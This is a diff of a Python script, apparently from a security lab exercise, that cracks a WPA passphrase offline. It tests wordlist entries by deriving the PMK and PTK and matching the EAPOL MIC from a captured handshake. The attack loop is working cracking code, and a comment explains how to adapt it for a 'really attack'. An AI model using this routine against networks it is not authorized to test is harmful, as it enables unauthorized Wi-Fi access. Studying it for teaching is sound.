@@ -64,21 +64,18 @@ data        = a2b_hex("%02x" % wpa[8][5].version +     # add version in 1 Byte h
                              "%04x" % wpa[8][5].len +  # Add len in 2 Byte hex
                              b2a_hex(wpa[8][5].load[:77]).decode().ljust(190, '0')) # Add Key (description + information + len) + Replay counter + Key (Nounce + IV + RSC ID) + padding
 
+# Loop on all word in the dicionary
+for word in dico[745:]: # Tweek to find more fastly, need to remove "[745:]" to use on really attack
+    passPhrase = str.encode(word[:-1]) # Remove '\n'
 
-for word in dico[745:]:
-    # Get one possible passhprase from the dictionary
-    passPhrase = str.encode(word[:-1])
-
-    # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
+    # Generate PMK
     pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)
 
-    # expand pmk to obtain PTK
+    # expand pmk to obtain PTK and generate MIC
     ptk = customPRF512(pmk, str.encode(A), B)
-
-    # calculate our own MIC over EAPOL payload - The ptk is, in fact, KCK|KEK|TK|MICK
     mic = hmac.new(ptk[0:16], data, hashlib.sha1)
 
-    # separate ptk into different keys - represent in hex
+    # Split PTK to keys (not used, can be print if the attack is a success)
     KCK = b2a_hex(ptk[0:16])
     KEK = b2a_hex(ptk[16:32])
     TK = b2a_hex(ptk[32:48])
@@ -87,9 +84,10 @@ for word in dico[745:]:
     # the MIC for the authentication is actually truncated to 16 bytes (32 chars). SHA-1 is 20 bytes long.
     MIC_hex_truncated = mic.hexdigest()[0:32]
 
-    # Control if the mic from the dictionary passphrase is the same the one from the passphrase we try to find
+    # Print info
     print("%s \t=> MIC: %s" % (passPhrase.decode(), MIC_hex_truncated))
 
+    # Test if the passphrase is correct
     if MIC_hex_truncated == mic_to_test:
         print("Pass phrase found! It's \"%s\"." % passPhrase.decode())
         exit(0)
